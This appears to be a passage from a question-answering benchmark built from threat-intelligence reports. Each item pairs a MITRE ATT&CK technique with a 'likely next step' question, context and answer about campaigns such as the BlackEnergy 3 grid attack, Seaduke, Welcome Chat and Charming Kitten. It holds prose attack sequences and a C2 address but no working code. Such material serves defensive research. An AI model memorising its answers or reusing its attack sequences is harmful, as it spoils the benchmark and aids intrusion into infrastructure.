Credential Access: Step 7: Harvest Credentials. Delivered BE3 malware plugins conduct credential harvesting and network discovery functions. Delivered BlackEnergy 3 malware plugins conduct credential harvesting and network discovery functions. Location: Corporate network Action: Active threat actor activity, malware execution Timeline: June 2015-December 2015 Device/application: Windows OS workstations, Windows domain controllers, virtual private network (VPN) service deployed in control environment Role in infrastructure: These systems support business operations, manage permissions and domain access, and provide remote network access respectively. Exploitation method: Adversaries use delivered BlackEnergy 3 plugins to gather stored credentials or log keystrokes. After gathering valid credentials for user with administrator privileges, adversaries use the stolen administrator credentials to access the domain controller, recover additional credentials, and create new privileged accounts. Impact: Adversaries obtain valid credentials enabling them to expand access across the corporate network and into the control environment, ensure persistent access, and blend into regular network traffic.
Command and Control: Step 5: Establish CC Connection. Malware establishes connection from the malicious implant on the targeted network to attacker-controlled CC server. Location: Corporate network Action: Malware execution Timeline: May 2014-June 2015 Device/application: Employee workstations, likely using MS Windows OS and provisioned with MS Internet Explorer web browser Role in infrastructure: Support email communications and other services used in business operations. Exploitation method: The external connection is established as part of the execution routine following installation of the malicious files. Once permissions to execute macros are granted by employees, the malicious VBA script installs the malware implant, and the implant attempts to communicate with an external server via HTTP requests. Impact: Adversaries gain unauthorized access to targeted networks, including the ability to deliver additional BlackEnergy plugins to enable internal network reconnaissance and credential harvesting.
Impact: Step 10: Develop Malicious Computer Code. Adversaries develop malicious computer code update for identified serial-to-Ethernet converters. Location: External infrastructure Action: Active threat actor activity Timeline: June 2015-December 2015 Device/application: Activity conducted external to network Role in infrastructure: Activity conducted external to network Exploitation method: After identifying deployed converts, adversaries begin a malware development and testing effort on infrastructure outside of the targeted network. Impact: Upon completion of this step, adversaries would have target-specific malware designed to disrupt communications with field devices by disabling deployed converters. Step 11: Deliver Data Destruction Malware. Adversaries likely deliver KillDisk malware to a network share and set policy on the domain controller to retrieve malware and execute upon system reboot. Location: Corporate and ICS network Action: Active threat actor activity Timeline: December 2015, directly preceding attack Device/application: Network share and Windows domain controller server Role in infrastructure: The network share provides access to shared digital resources, and the Windows domain controller manages access control throughout the network. Exploitation method: Adversaries likely use stolen credentials to place KillDisk malware on a network share, then set the retrieval and execution of the malicious files by implementing a policy on the compromised domain controller server. Impact: Prescheduling execution of malware enables coordination of multiple attack components, such that data destruction coincides with or shortly follows attacks against breakers. Step 12: Schedule Uninterruptable Power Supply (UPS) Disruption. Adversaries schedule unauthorized outage of UPS for telephone communication server and data center servers. Location: Corporate and ICS network Action: Active threat actor activity Timeline: Directly preceding December 2015 attack Device/application: Networked UPS devices with remote management interface Role in infrastructure: Prevent power outages from disrupting continuous operation of critical systems. Exploitation method: Adversaries likely use valid credentials to access privileged employee accounts, then use this access to remotely schedule unauthorized power outages. Impact: Prescheduling outages enables coordination of multiple attack components, such that critical systems also go down because of the power outages, stifling potential restoration efforts. Step 13: Trip Breakers. Adversaries use native remote access services and valid credentials to open breakers and disrupt power distribution to over 225,000 customers within three distribution areas. Location: ICS network Action: Active threat actor activity Timeline: December 23, 2015, during Device/application: HMI workstations, DMS servers, RTU, and the substation breakers Role in infrastructure: HMI workstations provide a graphical user interface for operators to remotely monitor and control devices within the control environment. DMS applications enable centralized monitoring and issuing of commands within a control environment. Substation breakers are devices designed to physically interrupt current flows through an electrical circuit. Exploitation method: Adversaries use valid credentials to seize control of operator workstations, access DMS client application via VPN, and issue unauthorized commands to breakers at substations. Impact: Opening of breakers results in disruption of electricity service to customers. Step 14: Sever Connection to Field Devices. After opening the breakers, adversaries deliver malicious computer code update to serial-to-Ethernet communications devices. The malicious updates render the converters inoperable, and sever connections between the control center and the substations. Location: ICS network Action: Active threat actor activity Timeline: December 23, 2015, during attack Device/application: Serial-to-Ethernet converters (Moxa UC 7408-LX-Plus,55 IRZRUH2 3G56) Role in infrastructure: Convert serial data from field devices to digital packets to be transmitted to remote monitoring and administration systems within the control network. Exploitation method: Adversaries use network access to push the malicious update over the network to targeted devices. Impact: Operators are unable to remotely close the breakers, requiring workers to manually close breakers at each substation. Forcing this manual response draws out recovery time Step 15: Telephony Denial-of-Service Attack. Adversaries initiate DoS attack on telephone call center at one of the targeted distributors. Location: Corporate network Action: Likely automated process Timeline: Dec 23, 2015, during attack Device/application: Operator telephone call center Role in infrastructure: Receive external telephone communications from customers. Exploitation method: Adversaries likely use automated IP-based call generators to flood the targeted call center. Impact: Automated calls overwhelm resources at call center, blocking legitimate communications from customers. Step 16: Disable Critical Systems via UPS Outage. Previously scheduled UPS outage cuts power to targeted telephone communications server and data center servers. Location: Corporate and ICS network Action: Execution of prescheduled process Timeline: December 23, 2015, during attack Device/application: Networked UPS devices with remote management interface, telephone communications server, and data center servers Role in infrastructure: Prevent power outages from disrupting continuous operation of critical systems. Exploitation method: Adversaries use network access to schedule the temporary backup power to be offline at the time of the power outages. Impact: Power loss to telephone server disrupts communications across remote sites, and disruptions at control centers inhibit ability to monitor and respond to attack against breakers. The disruption at the data center and associated system reboot trigger execution of KillDisk malware. Step 17: Destroy Critical System Data. Scheduled execution of KillDisk malware erases the master boot records and deletes system log data on targeted machines across the victims' corporate and ICS network. Location: Corporate network and ICS network Action: Malware execution Timeline: December 23, 2015, during attack Device/application: RTU device (ABB RTU560 CMU-02),57 servers and workstations used by management, human resources (HR), and finance staff Role in infrastructure: The RTU functions as a communication processor or data concentrator in a substation, enabling communications and data transfer between field devices in the substations and the control center.58 Servers and workstations are used by management, HR, and finance staff to conduct business administration operations. Exploitation method: Malware is retrieved from the network share and executed on networked devices according to direction received via domain controller policy or local Windows Task Scheduler. Impact: Targeted systems are rendered inoperable, and critical data is destroyed.",Yes,intelligence-games-in-the-power-grid-2016
2012,352,352-Command and Control-T1071-Application Layer Protocol,"After the Welcome Chat app ensures persistence by auto-starting at device boot through the BOOT_COMPLETED broadcast and subsequently collects device information and GPS location for discovery, is it likely that the app uploads exfiltrated data to its C&C server using the HTTP protocol as part of its command and control operations?",Command and Control: The Welcome Chat app sends information about the device to its command and control (C&C) server and is ready to receive commands. It contacts the C&C server every five minutes and uploads exfiltrated data using the HTTP protocol.,"Initial Access: We discovered a new operation within a long-running cyber-espionage campaign in the Middle East. The operation targets Android users via the malicious Welcome Chat app, which is linked to the malware named BadPatch and the Gaza Hackers threat actor group, also known as Molerats. The app is advertised on a dedicated website in Arabic, suggesting a focus on Arabic-speaking users. The domain for this website was registered in October 2019.
Persistence: The Welcome Chat app is designed to auto-start at device boot by listening for the BOOT_COMPLETED broadcast, ensuring that its functionality is activated every time the device starts.
Discovery: The Welcome Chat app collects information about the device, including device info and GPS location.
Collection: The Welcome Chat app has the capability to exfiltrate sent and received SMS messages, call log history, contact list, user photos, recorded phone calls, and the GPS location of the device.
Others: The Welcome Chat app, which claims to be a secure messaging platform, is actually a functioning chat app with hidden espionage capabilities. It was never available on the official Android app store and requires permissions that are intrusive but may seem natural for a messaging app. The app's infrastructure was not built with security in mind, leaving harvested data from victims freely available on the internet via an unsecured server. The malicious code in the app appears to be copied from publicly available open-source projects and code snippets. The espionage app is believed to be developed by the attackers rather than being a trojanized version of a legitimate app. The campaign is linked to the threat actors behind the long-term BadPatch campaign. ESET researchers recommend not installing apps from outside the official Google Play store and to be cautious of app permissions.",Yes,Welcome Chat as a secure messaging app_ Nothing could be further from the truth _ WeLiveSecurity
2016,352,352-Discovery-T1614-System Location Discovery,"After ensuring persistence by auto-starting at device boot through listening for the BOOT_COMPLETED broadcast, is the Welcome Chat app likely to collect device information such as GPS location before uploading the exfiltrated data to its C&C server using the HTTP protocol?","Discovery: The Welcome Chat app collects information about the device, including device info and GPS location.","Initial Access: We discovered a new operation within a long-running cyber-espionage campaign in the Middle East. The operation targets Android users via the malicious Welcome Chat app, which is linked to the malware named BadPatch and the Gaza Hackers threat actor group, also known as Molerats. The app is advertised on a dedicated website in Arabic, suggesting a focus on Arabic-speaking users. The domain for this website was registered in October 2019.
Persistence: The Welcome Chat app is designed to auto-start at device boot by listening for the BOOT_COMPLETED broadcast, ensuring that its functionality is activated every time the device starts.
Collection: The Welcome Chat app has the capability to exfiltrate sent and received SMS messages, call log history, contact list, user photos, recorded phone calls, and the GPS location of the device.
Command and Control: The Welcome Chat app sends information about the device to its command and control (C&C) server and is ready to receive commands. It contacts the C&C server every five minutes and uploads exfiltrated data using the HTTP protocol.
Others: The Welcome Chat app, which claims to be a secure messaging platform, is actually a functioning chat app with hidden espionage capabilities. It was never available on the official Android app store and requires permissions that are intrusive but may seem natural for a messaging app. The app's infrastructure was not built with security in mind, leaving harvested data from victims freely available on the internet via an unsecured server. The malicious code in the app appears to be copied from publicly available open-source projects and code snippets. The espionage app is believed to be developed by the attackers rather than being a trojanized version of a legitimate app. The campaign is linked to the threat actors behind the long-term BadPatch campaign. ESET researchers recommend not installing apps from outside the official Google Play store and to be cautious of app permissions.",Yes,Welcome Chat as a secure messaging app_ Nothing could be further from the truth _ WeLiveSecurity
2023,353,353-Command and Control-T1071-Application Layer Protocol,"After utilizing Seaduke to retrieve detailed bot/system information and securely delete itself using a 'seppuku' function, is it likely that Seaduke will communicate with its command-and-control (C&C) server and remain under the attackers' control via HTTP/HTTPS with layered encoding and encryption?","Command and Control: Seaduke operates by securely communicating with the command-and-control (C&C) server over HTTP/HTTPS beneath layers of encoding (Base64) and encryption (RC4, AES). The attackers can control Seaduke in a similar fashion to Cozyduke, with the Seaduke control infrastructure being essentially distinct, allowing for the possibility of sub-teams concurrently exploiting the target network.","Initial Access: Symantec has identified that the Duke group, using Trojan.Cozer (aka Cozyduke), initiated their campaign as early as March 2014, targeting a private research institute in Washington, D.C. The group employed tactics such as sending 'Office Monkeys'- and 'eFax'-themed emails containing a Cozyduke payload to compromise high-profile government networks. These emails were used as a smokescreen to hide the true intent of the attacks.
Defense Evasion: Seaduke, a low-profile information-stealing Trojan, is capable of hiding behind multiple layers of encryption and obfuscation. It is designed to quietly steal and exfiltrate sensitive information such as emails from the victim's computer. Seaduke has a highly configurable framework, with hundreds of different configurations found on compromised networks. The malware's communication protocol employs many layers of encryption and obfuscation, using over 200 compromised web servers for command and control.
Credential Access: The Duke group has developed additional payloads for specific attacks, including impersonation using Kerberos pass-the-ticket attacks (Mimikatz PowerShell) and email extraction from the MS Exchange Server using compromised credentials.
Collection: The Duke group's Seaduke payload allows attackers to retrieve detailed bot/system information, update bot configuration, upload files, download files, and securely delete the malware from the system using a self-delete function named 'seppuku'.
Exfiltration: The Duke group utilizes Seaduke to archive sensitive information and exfiltrate data via legitimate cloud services, as well as to perform secure file deletion.
Others: The Duke group, responsible for the Seaduke malware, has been compromising governmental and diplomatic organizations since at least 2010. The group has a range of malware tools known as the Dukes, including Cozyduke, Miniduke, and Cosmicduke. They have mounted an extended campaign targeting high-profile networks and have sophisticated operators with fine-tuned computer network exploitation skills. The group's operational capability has reached a new level, and despite drawing significant attention, they continue to operate and are expected to reappear with potentially reworked or new tools.",Yes,Forkmeiamfamous_SeaDuke
2025,353,353-Command and Control-T1132-Data Encoding,"After Seaduke utilizes its payload to retrieve detailed bot/system information, update configurations, upload/download files, or securely delete itself, is it likely that it will communicate with the C&C server beneath layers of encoding and encryption before archiving sensitive information and exfiltrating data via legitimate cloud services?","Command and Control: Seaduke operates by securely communicating with the command-and-control (C&C) server over HTTP/HTTPS beneath layers of encoding (Base64) and encryption (RC4, AES). The attackers can control Seaduke in a similar fashion to Cozyduke, with the Seaduke control infrastructure being essentially distinct, allowing for the possibility of sub-teams concurrently exploiting the target network.","Initial Access: Symantec has identified that the Duke group, using Trojan.Cozer (aka Cozyduke), initiated their campaign as early as March 2014, targeting a private research institute in Washington, D.C. The group employed tactics such as sending 'Office Monkeys'- and 'eFax'-themed emails containing a Cozyduke payload to compromise high-profile government networks. These emails were used as a smokescreen to hide the true intent of the attacks.
Defense Evasion: Seaduke, a low-profile information-stealing Trojan, is capable of hiding behind multiple layers of encryption and obfuscation. It is designed to quietly steal and exfiltrate sensitive information such as emails from the victim's computer. Seaduke has a highly configurable framework, with hundreds of different configurations found on compromised networks. The malware's communication protocol employs many layers of encryption and obfuscation, using over 200 compromised web servers for command and control.
Credential Access: The Duke group has developed additional payloads for specific attacks, including impersonation using Kerberos pass-the-ticket attacks (Mimikatz PowerShell) and email extraction from the MS Exchange Server using compromised credentials.
Collection: The Duke group's Seaduke payload allows attackers to retrieve detailed bot/system information, update bot configuration, upload files, download files, and securely delete the malware from the system using a self-delete function named 'seppuku'.
Exfiltration: The Duke group utilizes Seaduke to archive sensitive information and exfiltrate data via legitimate cloud services, as well as to perform secure file deletion.
Others: The Duke group, responsible for the Seaduke malware, has been compromising governmental and diplomatic organizations since at least 2010. The group has a range of malware tools known as the Dukes, including Cozyduke, Miniduke, and Cosmicduke. They have mounted an extended campaign targeting high-profile networks and have sophisticated operators with fine-tuned computer network exploitation skills. The group's operational capability has reached a new level, and despite drawing significant attention, they continue to operate and are expected to reappear with potentially reworked or new tools.",Yes,Forkmeiamfamous_SeaDuke
2027,353,353-Exfiltration-T1567-Exfiltration Over Web Service,"After the Duke group uses Seaduke to securely communicate with the command-and-control server employing multiple layers of encryption and encoding for Command and Control, is it likely that they will exfiltrate sensitive data to legitimate cloud services using Seaduke for Exfiltration?","Exfiltration: The Duke group utilizes Seaduke to archive sensitive information and exfiltrate data via legitimate cloud services, as well as to perform secure file deletion.","Initial Access: Symantec has identified that the Duke group, using Trojan.Cozer (aka Cozyduke), initiated their campaign as early as March 2014, targeting a private research institute in Washington, D.C. The group employed tactics such as sending 'Office Monkeys'- and 'eFax'-themed emails containing a Cozyduke payload to compromise high-profile government networks. These emails were used as a smokescreen to hide the true intent of the attacks.
Defense Evasion: Seaduke, a low-profile information-stealing Trojan, is capable of hiding behind multiple layers of encryption and obfuscation. It is designed to quietly steal and exfiltrate sensitive information such as emails from the victim's computer. Seaduke has a highly configurable framework, with hundreds of different configurations found on compromised networks. The malware's communication protocol employs many layers of encryption and obfuscation, using over 200 compromised web servers for command and control.
Credential Access: The Duke group has developed additional payloads for specific attacks, including impersonation using Kerberos pass-the-ticket attacks (Mimikatz PowerShell) and email extraction from the MS Exchange Server using compromised credentials.
Collection: The Duke group's Seaduke payload allows attackers to retrieve detailed bot/system information, update bot configuration, upload files, download files, and securely delete the malware from the system using a self-delete function named 'seppuku'.
Command and Control: Seaduke operates by securely communicating with the command-and-control (C&C) server over HTTP/HTTPS beneath layers of encoding (Base64) and encryption (RC4, AES). The attackers can control Seaduke in a similar fashion to Cozyduke, with the Seaduke control infrastructure being essentially distinct, allowing for the possibility of sub-teams concurrently exploiting the target network.
Others: The Duke group, responsible for the Seaduke malware, has been compromising governmental and diplomatic organizations since at least 2010. The group has a range of malware tools known as the Dukes, including Cozyduke, Miniduke, and Cosmicduke. They have mounted an extended campaign targeting high-profile networks and have sophisticated operators with fine-tuned computer network exploitation skills. The group's operational capability has reached a new level, and despite drawing significant attention, they continue to operate and are expected to reappear with potentially reworked or new tools.",Yes,Forkmeiamfamous_SeaDuke
2028,353,353-Credential Access-T1558-Steal or Forge Kerberos Tickets,"After Seaduke hides behind multiple layers of encryption and obfuscation to evade defenses, is the Duke group likely to use Mimikatz PowerShell to conduct Kerberos pass-the-ticket attacks for credential access before later leveraging Seaduke to retrieve system information and securely delete itself?","Credential Access: The Duke group has developed additional payloads for specific attacks, including impersonation using Kerberos pass-the-ticket attacks (Mimikatz PowerShell) and email extraction from the MS Exchange Server using compromised credentials.","Initial Access: Symantec has identified that the Duke group, using Trojan.Cozer (aka Cozyduke), initiated their campaign as early as March 2014, targeting a private research institute in Washington, D.C. The group employed tactics such as sending 'Office Monkeys'- and 'eFax'-themed emails containing a Cozyduke payload to compromise high-profile government networks. These emails were used as a smokescreen to hide the true intent of the attacks.
Defense Evasion: Seaduke, a low-profile information-stealing Trojan, is capable of hiding behind multiple layers of encryption and obfuscation. It is designed to quietly steal and exfiltrate sensitive information such as emails from the victim's computer. Seaduke has a highly configurable framework, with hundreds of different configurations found on compromised networks. The malware's communication protocol employs many layers of encryption and obfuscation, using over 200 compromised web servers for command and control.
Collection: The Duke group's Seaduke payload allows attackers to retrieve detailed bot/system information, update bot configuration, upload files, download files, and securely delete the malware from the system using a self-delete function named 'seppuku'.
Command and Control: Seaduke operates by securely communicating with the command-and-control (C&C) server over HTTP/HTTPS beneath layers of encoding (Base64) and encryption (RC4, AES). The attackers can control Seaduke in a similar fashion to Cozyduke, with the Seaduke control infrastructure being essentially distinct, allowing for the possibility of sub-teams concurrently exploiting the target network.
Exfiltration: The Duke group utilizes Seaduke to archive sensitive information and exfiltrate data via legitimate cloud services, as well as to perform secure file deletion.
Others: The Duke group, responsible for the Seaduke malware, has been compromising governmental and diplomatic organizations since at least 2010. The group has a range of malware tools known as the Dukes, including Cozyduke, Miniduke, and Cosmicduke. They have mounted an extended campaign targeting high-profile networks and have sophisticated operators with fine-tuned computer network exploitation skills. The group's operational capability has reached a new level, and despite drawing significant attention, they continue to operate and are expected to reappear with potentially reworked or new tools.",Yes,Forkmeiamfamous_SeaDuke
2030,353,353-Collection-T1074-Data Staged,"After employing Kerberos pass-the-ticket attacks for credential access using Mimikatz PowerShell and extracting emails from the MS Exchange Server with compromised credentials, is it likely that the Duke group will retrieve detailed system information and stage data by uploading and downloading files before securely communicating with the C&C server over HTTP/HTTPS using Base64 and RC4/AES encryption?","Collection: The Duke group's Seaduke payload allows attackers to retrieve detailed bot/system information, update bot configuration, upload files, download files, and securely delete the malware from the system using a self-delete function named 'seppuku'.","Initial Access: Symantec has identified that the Duke group, using Trojan.Cozer (aka Cozyduke), initiated their campaign as early as March 2014, targeting a private research institute in Washington, D.C. The group employed tactics such as sending 'Office Monkeys'- and 'eFax'-themed emails containing a Cozyduke payload to compromise high-profile government networks. These emails were used as a smokescreen to hide the true intent of the attacks.
Defense Evasion: Seaduke, a low-profile information-stealing Trojan, is capable of hiding behind multiple layers of encryption and obfuscation. It is designed to quietly steal and exfiltrate sensitive information such as emails from the victim's computer. Seaduke has a highly configurable framework, with hundreds of different configurations found on compromised networks. The malware's communication protocol employs many layers of encryption and obfuscation, using over 200 compromised web servers for command and control.
Credential Access: The Duke group has developed additional payloads for specific attacks, including impersonation using Kerberos pass-the-ticket attacks (Mimikatz PowerShell) and email extraction from the MS Exchange Server using compromised credentials.
Command and Control: Seaduke operates by securely communicating with the command-and-control (C&C) server over HTTP/HTTPS beneath layers of encoding (Base64) and encryption (RC4, AES). The attackers can control Seaduke in a similar fashion to Cozyduke, with the Seaduke control infrastructure being essentially distinct, allowing for the possibility of sub-teams concurrently exploiting the target network.
Exfiltration: The Duke group utilizes Seaduke to archive sensitive information and exfiltrate data via legitimate cloud services, as well as to perform secure file deletion.
Others: The Duke group, responsible for the Seaduke malware, has been compromising governmental and diplomatic organizations since at least 2010. The group has a range of malware tools known as the Dukes, including Cozyduke, Miniduke, and Cosmicduke. They have mounted an extended campaign targeting high-profile networks and have sophisticated operators with fine-tuned computer network exploitation skills. The group's operational capability has reached a new level, and despite drawing significant attention, they continue to operate and are expected to reappear with potentially reworked or new tools.",Yes,Forkmeiamfamous_SeaDuke
2037,354,354-Exfiltration-T1041-Exfiltration Over C2 Channel,"After BlackEnergy 3 malware uses HTTP protocol to communicate with its C2 server and send localization data and keyboard layout information, is it likely that the malware will function as a network sniffer and send gathered information to the C2 server as part of its exfiltration process?","Exfiltration: The CTI report describes BlackEnergy 3 malware's data exfiltration capabilities, where it functions as a network sniffer and sends gathered information to the C2 server.","Initial Access: The CTI report by Udi Shamir, dated 1/26/2016, details a new variant of BlackEnergy 3 malware targeting Ukrainian power facilities, leveraging a vulnerability CVE-2014-4114 in Microsoft Office 2013's OLE packager. The attack vector involves infected Excel documents that, when executed, propagate the malware within the network. This suggests the involvement of an internal actor, as Office 2013 has been patched against this vulnerability, indicating that the attack could only succeed through unpatched systems or deliberate internal execution.
Execution: The CTI report describes the execution of BlackEnergy 3 malware through a Visual Basic macro embedded in an Excel document. The macro reassembles and executes a portable executable (PE32) named vba_macro.exe stored in the Windows TMP directory. This executable, in turn, drops two additional executables, FONTCACHE.DAT and rundll32.exe, and then deletes itself. FONTCACHE.DAT operates as a network sniffer, and rundll32.exe is used to load this malicious DLL.
Persistence: The CTI report indicates that BlackEnergy 3 malware achieves persistence by registering a binary to the startup shell using the RegSetValueExw() function, ensuring that FONTCACHE.DAT is executed upon system startup.
Defense Evasion: The CTI report outlines multiple anti-debugging techniques used by BlackEnergy 3 malware, including CryptDecrypt() function calls on itself, SetUnhandledExceptionFilter API, kernel debugger checks, and IsDebuggerPresent API. Additionally, the malware attempts to detect runtime checksum changes to evade non-hardware breakpoints.
Discovery: The CTI report notes that BlackEnergy 3 malware gathers information for lateral movement by using the GetAdaptersInfo() function API to retrieve network information for the local computer.
Lateral Movement: The CTI report mentions that BlackEnergy 3 malware is designed for lateral movement, sending data to servers deployed in major ISPs across Europe.
Command and Control: The CTI report identifies that BlackEnergy 3 malware communicates with its command and control (C2) server using HTTP protocol, with the IP address 5.149.254.114 associated with FORTUNIX-NETWORS. The malware sends localization data and keyboard layout information to the C2 server.
Others: The CTI report by Udi Shamir suggests that BlackEnergy 3 malware is a product of a nation-sponsored campaign, likely involving multiple teams. It is associated with the Sandworm Team and has been used in various campaigns, including those targeting NATO countries and the conflict with Russia. The malware's toolkit is believed to be used for 'black ops' and has been linked to the shutdown of Estonian internet and government websites in 2007. The report also highlights the malware's high entropy and sophisticated evasion techniques, including encryption, encoding, and anti-debugging measures.",Yes,BlackEnergy3_WP_012716_1c
2038,354,354-Discovery-T1016-System Network Configuration Discovery,"After persistently registering FONTCACHE.DAT to the startup shell using the RegSetValueExw() function, is it likely that BlackEnergy 3 will use the GetAdaptersInfo() function API to gather network information for lateral movement before sending this information to command and control servers located in European ISPs?",Discovery: The CTI report notes that BlackEnergy 3 malware gathers information for lateral movement by using the GetAdaptersInfo() function API to retrieve network information for the local computer.,"Initial Access: The CTI report by Udi Shamir, dated 1/26/2016, details a new variant of BlackEnergy 3 malware targeting Ukrainian power facilities, leveraging a vulnerability CVE-2014-4114 in Microsoft Office 2013's OLE packager. The attack vector involves infected Excel documents that, when executed, propagate the malware within the network. This suggests the involvement of an internal actor, as Office 2013 has been patched against this vulnerability, indicating that the attack could only succeed through unpatched systems or deliberate internal execution.
Execution: The CTI report describes the execution of BlackEnergy 3 malware through a Visual Basic macro embedded in an Excel document. The macro reassembles and executes a portable executable (PE32) named vba_macro.exe stored in the Windows TMP directory. This executable, in turn, drops two additional executables, FONTCACHE.DAT and rundll32.exe, and then deletes itself. FONTCACHE.DAT operates as a network sniffer, and rundll32.exe is used to load this malicious DLL.
Persistence: The CTI report indicates that BlackEnergy 3 malware achieves persistence by registering a binary to the startup shell using the RegSetValueExw() function, ensuring that FONTCACHE.DAT is executed upon system startup.
Defense Evasion: The CTI report outlines multiple anti-debugging techniques used by BlackEnergy 3 malware, including CryptDecrypt() function calls on itself, SetUnhandledExceptionFilter API, kernel debugger checks, and IsDebuggerPresent API. Additionally, the malware attempts to detect runtime checksum changes to evade non-hardware breakpoints.
Lateral Movement: The CTI report mentions that BlackEnergy 3 malware is designed for lateral movement, sending data to servers deployed in major ISPs across Europe.
Command and Control: The CTI report identifies that BlackEnergy 3 malware communicates with its command and control (C2) server using HTTP protocol, with the IP address 5.149.254.114 associated with FORTUNIX-NETWORS. The malware sends localization data and keyboard layout information to the C2 server.
Exfiltration: The CTI report describes BlackEnergy 3 malware's data exfiltration capabilities, where it functions as a network sniffer and sends gathered information to the C2 server.
Others: The CTI report by Udi Shamir suggests that BlackEnergy 3 malware is a product of a nation-sponsored campaign, likely involving multiple teams. It is associated with the Sandworm Team and has been used in various campaigns, including those targeting NATO countries and the conflict with Russia. The malware's toolkit is believed to be used for 'black ops' and has been linked to the shutdown of Estonian internet and government websites in 2007. The report also highlights the malware's high entropy and sophisticated evasion techniques, including encryption, encoding, and anti-debugging measures.",Yes,BlackEnergy3_WP_012716_1c
2040,355,355-Reconnaissance-T1589-Gather Victim Identity Information,"After establishing fake personas and creating falsified identities during the Resource Development phase, is it likely that Iranian threat actors will connect with US officials on social media to gather victim identity information during the Reconnaissance phase before using spear-phishing messages with links to fake pages for Initial Access?","Reconnaissance: Iranian threat actors conducted a cyber espionage operation named NEWSCASTER since 2011, using fake personas on social media to connect with US officials and gather information. They created over a dozen fake personas, including falsified identities from news organizations and attractive women profiles, supported by a fictitious news organization called NewsOnAir.org. The attackers connected with over 2,000 individuals to access information on their location, activities, and relationships.","Resource Development: The NEWSCASTER operation involved creating fake personas and a fictitious news organization to support their espionage activities. They used these personas to establish connections on social media platforms and harvest credentials.
Initial Access: The Iranian hackers used social media platforms such as Facebook, Twitter, LinkedIn, Google+, YouTube, and Blogger to initiate their attack. They sent spear-phishing messages with links to fake pages to capture credentials, gaining initial access to their targets' networks.
Defense Evasion: The NEWSCASTER campaign, while not technically sophisticated, was effective and under the radar. The attackers used low-tech approaches to avoid traditional security defenses, exploiting social media and the human element, which is often the weakest link in security.
Credential Access: The campaign focused on credential harvesting and reconnaissance. The attackers used social media connections to harvest corporate and personal email credentials, which could be used for further lateral movements within the targeted networks.
Lateral Movement: After establishing connections on social media, the attackers used the harvested credentials to potentially move laterally within the networks of their targets, which included senior U.S. military and diplomatic personnel, congressional personnel, journalists, think tanks, and defense contractors in the U.S. and Israel, among others.
Command and Control: The campaign leveraged malware with the capability to exfiltrate data, although the malware used was not particularly sophisticated.
Others: The NEWSCASTER operation targeted victims in the U.K., Saudi Arabia, Iraq, and vocal supporters of Israel, suggesting an interest in political, military, diplomatic, and technical intelligence. The attackers maintained a regular work schedule consistent with Tehran's timezone, and their targets and technical indicators led iSIGHT Partners to believe the campaign originated from Iran. iSIGHT Partners coordinated with the FBI and notified social networks, leading to the removal of malicious personas from Facebook and LinkedIn. The report comes after FireEye suggested that Iranian attackers' methodologies have become more consistent with other advanced persistent threat actors in Iran following cyber attacks against Iran in the late 2000s.",Yes,Iranian Hackers Targeted US Officials in Elaborate Social Media Attack Operation _ SecurityWeek
2048,357,357-Reconnaissance-T1589-Gather Victim Identity Information,"After Charming Kitten created fake websites impersonating Google services and Instagram to obtain credentials during the Resource Development phase, is it likely that they targeted non-Iranian researchers by impersonating well-known researchers or journalists during the Reconnaissance phase?","Reconnaissance: In 2019, the Iranian cyberespionage group Charming Kitten, also known as APT35 or Ajax, initiated a new cyber espionage campaign targeting non-Iranian researchers from the US, Middle East, and France, focusing on academic research of Iran, as well as Iranian dissidents in the US. The group impersonated well-known researchers or journalists and invited recipients to events, using the targets' language in some cases. They also added trackers to their email correspondences to follow forwarded emails and obtain geolocation information.","Resource Development: Charming Kitten's campaign involved the use of fake websites impersonating various entities and services, including Google services like Gmail or Google Drive, and for the first time, Instagram's official website. These websites were used to extract credentials and were hosted on servers provided by BelCloud Hosting Corporation in Bulgaria. The attackers switched servers used to store email addresses containing thousands of addresses after a month of campaign operations.
Initial Access: The campaign's first stage involved sending socially engineered email messages impersonating known researchers or journalists, inviting victims to events. The second stage redirected victims to decoy websites impersonating Google services and other entities. In August 2019, the group expanded its activities to target influential public figures worldwide.
Defense Evasion: Charming Kitten used email trackers to monitor whether their phishing emails were forwarded and to collect victims' geolocation and IP addresses. They also used a cookie installed on the victim's machine to gather data.
Credential Access: The attackers created phishing websites impersonating Instagram and Google services to steal credentials from victims. These websites were part of the campaign's second stage, which likely aimed at data theft.
Command and Control: Charming Kitten used more than six unique servers to host their fake websites, with four impersonating entities and two impersonating Google services. The servers were used to control the phishing websites and collect stolen data.
Others: ClearSky Security Ltd. attributed the campaign to Charming Kitten based on factors such as the use of specific websites linked in the attack, the targeting of non-Iranian investigators whose expertise fits Charming Kitten's TTPs, and the impersonation of NIAC, indicating an Iranian actor. The group's activity was also tied to Iran through the NetBlock of the IP addresses of the original servers, which included an Iranian company's website.",Yes,The-Kittens-Are-Back-in-Town-Charming-Kitten-2019
2049,357,357-Reconnaissance-T1598-Phishing for Information,"After Charming Kitten used fake websites hosted on servers from BelCloud Hosting Corporation for resource development, is it likely that they impersonated well-known researchers or journalists to initiate the cyber espionage campaign targeting non-Iranian researchers during the reconnaissance phase before redirecting victims to decoy websites for initial access?","Reconnaissance: In 2019, the Iranian cyberespionage group Charming Kitten, also known as APT35 or Ajax, initiated a new cyber espionage campaign targeting non-Iranian researchers from the US, Middle East, and France, focusing on academic research of Iran, as well as Iranian dissidents in the US. The group impersonated well-known researchers or journalists and invited recipients to events, using the targets' language in some cases. They also added trackers to their email correspondences to follow forwarded emails and obtain geolocation information.","Resource Development: Charming Kitten's campaign involved the use of fake websites impersonating various entities and services, including Google services like Gmail or Google Drive, and for the first time, Instagram's official website. These websites were used to extract credentials and were hosted on servers provided by BelCloud Hosting Corporation in Bulgaria. The attackers switched servers used to store email addresses containing thousands of addresses after a month of campaign operations.
Initial Access: The campaign's first stage involved sending socially engineered email messages impersonating known researchers or journalists, inviting victims to events. The second stage redirected victims to decoy websites impersonating Google services and other entities. In August 2019, the group expanded its activities to target influential public figures worldwide.
Defense Evasion: Charming Kitten used email trackers to monitor whether their phishing emails were forwarded and to collect victims' geolocation and IP addresses. They also used a cookie installed on the victim's machine to gather data.
Credential Access: The attackers created phishing websites impersonating Instagram and Google services to steal credentials from victims. These websites were part of the campaign's second stage, which likely aimed at data theft.
Command and Control: Charming Kitten used more than six unique servers to host their fake websites, with four impersonating entities and two impersonating Google services. The servers were used to control the phishing websites and collect stolen data.
